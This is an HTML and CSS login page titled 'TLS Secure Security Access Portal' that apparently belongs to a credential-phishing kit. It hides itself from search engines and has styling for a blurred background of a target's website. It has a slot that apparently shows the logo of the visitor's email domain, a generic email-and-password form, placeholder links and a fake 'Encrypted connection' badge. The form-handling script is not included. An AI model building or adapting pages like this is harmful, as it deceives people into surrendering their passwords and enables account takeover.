<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>TLS Login Portal</title>

<link rel="icon" type="image/png"
      href="https://img.logo.dev/?token=pk_X3Yst72FQUOeVfOd-dlhKg">

<style>
:root{
  --primary:#2563eb;
  --bg:#020617;
  --card:rgba(2,6,23,.92);
  --border:#1f2937;
  --text:#e5e7eb;
  --muted:#94a3b8;
  --warn:#eab308;
}

*{box-sizing:border-box;margin:0;padding:0}

html,body{
  height:100%;
  font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
  color:var(--text);
  overflow:hidden;
}

/* Website iframe as background - WITH BLUR */
.website-background {
  position: fixed;
  inset: 0;
  width: 100%;
  height: 100%;
  z-index: -1;
  border: none;
  background: white;
  opacity: 0;
  transition: opacity 1s ease;
  filter: blur(8px); /* Added blur effect */
  transform: scale(1.05); /* Slight zoom to hide blur edges */
}

.website-background.loaded {
  opacity: 1;
}

.overlay {
  position: fixed;
  inset: 0;
  width: 100%;
  height: 100%;
  z-index: -1;
  background: rgba(2, 6, 23, 0.85);
  pointer-events: none;
}

.background-default {
  position: fixed;
  inset: 0;
  width: 100%;
  height: 100%;
  z-index: -2;
  background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
}

body { animation: fade .7s ease both; }
@keyframes fade { from { opacity: 0; } to { opacity: 1; } }

.wrap {
  min-height: 100%;
  display: grid;
  place-items: center;
  padding: 24px;
}

.card {
  width: 100%;
  max-width: 420px;
  background: var(--card);
  backdrop-filter: blur(10px);
  border: 1px solid var(--border);
  border-radius: 14px;
  padding: 32px 28px;
  box-shadow: 0 30px 60px rgba(0,0,0,.55);
  animation: up .5s ease both;
}

@keyframes up {
  from { transform: translateY(14px); opacity: 0; }
  to { transform: translateY(0); opacity: 1; }
}

.brand {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 22px;
}

.brand img {
  width: 46px;
  height: 46px;
  border-radius: 10px;
  padding: 6px;
  background: #0b1220;
  border: 1px solid var(--border);
}

.brand h1 { font-size: 18px; font-weight: 600; }
.subtitle { font-size: 13px; color: var(--muted); }

.field { margin-bottom: 16px; }
label {
  font-size: 12px;
  color: var(--muted);
  margin-bottom: 6px;
  display: block;
}

input {
  width: 100%;
  padding: 12px 14px;
  border-radius: 10px;
  border: 1px solid var(--border);
  background: #020617;
  color: var(--text);
}

input:focus {
  outline: none;
  border-color: var(--primary);
  box-shadow: 0 0 0 3px rgba(37,99,235,.25);
}

.pass-wrap { position: relative; }
.toggle {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  font-size: 12px;
  color: #93c5fd;
  cursor: pointer;
  user-select: none;
}

.btn {
  width: 100%;
  padding: 12px;
  border-radius: 10px;
  border: none;
  background: linear-gradient(135deg, #60a5fa, var(--primary));
  color: #020617;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
}

.btn:hover { filter: brightness(1.05); transform: translateY(-1px); }
.btn:disabled { opacity: 0.6; cursor: not-allowed; }

.message {
  padding: 10px 14px;
  border-radius: 8px;
  margin: 12px 0;
  font-size: 13px;
  display: none;
}
.message.success {
  display: block;
  background: rgba(34,197,94,0.15);
  border: 1px solid #22c55e;
  color: #86efac;
}
.message.error {
  display: block;
  background: rgba(239,68,68,0.15);
  border: 1px solid #ef4444;
  color: #fca5a5;
}

.links {
  margin-top: 14px;
  display: flex;
  justify-content: space-between;
  font-size: 12px;
}
.links a { color: #93c5fd; text-decoration: none; }

.trust {
  margin-top: 18px;
  font-size: 12px;
  color: var(--muted);
  display: flex;
  align-items: center;
  gap: 8px;
}

.lock { width: 16px; height: 16px; fill: #22c55e; }

.footer {
  margin-top: 18px;
  font-size: 11px;
  color: var(--muted);
  text-align: center;
}

.domain-info {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-top: 4px;
  font-size: 11px;
  color: var(--muted);
}

.domain-logo {
  width: 14px;
  height: 14px;
  border-radius: 3px;
  object-fit: contain;
}

.language-selector {
  position: fixed;
  top: 20px;
  right: 20px;
  z-index: 1000;
}

.lang-btn {
  background: rgba(2, 6, 23, 0.8);
  border: 1px solid var(--border);
  color: var(--text);
  padding: 8px 16px;
  border-radius: 8px;
  cursor: pointer;
  font-size: 12px;
  backdrop-filter: blur(10px);
  transition: all 0.2s ease;
}

.lang-btn:hover {
  background: rgba(37, 99, 235, 0.2);
  border-color: var(--primary);
}
</style>
</head>

<body>

<div class="background-default"></div>
<div class="overlay"></div>

<div class="language-selector">
  <button class="lang-btn" id="langToggle">üåê English</button>
</div>

<div class="wrap">
<main class="card ">

<div class="brand">
  <img id="logoImg" src="https://img.logo.dev/?token=pk_X3Yst72FQUOeVfOd-dlhKg">
  <div>
    <h1>TLS Secure</h1>
    <div class="subtitle" data-i18n="subtitle">Security Access Portal</div>
  </div>
</div>

<div id="message" class="message"></div>

<form id="loginForm" method="POST">

  <div class="field">
    <label for="user_email" data-i18n="email_label">Email</label>
    <input type="email"
           name="user_email"
           id="user_email"
           required
           autocomplete="username">
    <div id="domainInfo" class="domain-info"></div>
  </div>

  <div class="field pass-wrap">
    <label for="pw" data-i18n="password_label">Password</label>
    <input id="pw"
           type="password"
           name="user_password"
           required
           autocomplete="current-password">
    <span class="toggle" id="togglePassword" data-i18n="show_password">
      Show
    </span>
  </div>

  <button type="submit" class="btn" data-i18n="login_button">Login</button>
</form>

<div class="links">
  <a href="#" data-i18n="forgot_password">Forgot password?</a>
  <a href="#" data-i18n="alternative_method">Use alternative method</a>
</div>

<div class="trust">
  <svg class="lock" viewBox="0 0 24 24">
    <path d="M12 1a5 5 0 00-5 5v4H6a2 2 0 00-2 2v9a2 2 0 002 2h12a2 2 0 002-2v-9a2 2 0 00-2-2h-1V6a5 5 0 00-5-5zm-3 9V6a3 3 0 016 0v4H9z"/>
  </svg>
  <span data-i18n="encrypted_connection">Encrypted connection</span>
</div>

<div class="footer">
  <span data-i18n="copyright">¬© 2024</span>
  <span data-i18n="privacy">Privacy</span>
  ¬∑
  <span data-i18n="terms">Terms</span>
  ¬∑
  <span data-i18n="security">Security</span>
</div>

</main>
</div>

<script src="script.js"></script>

</body>
</html>
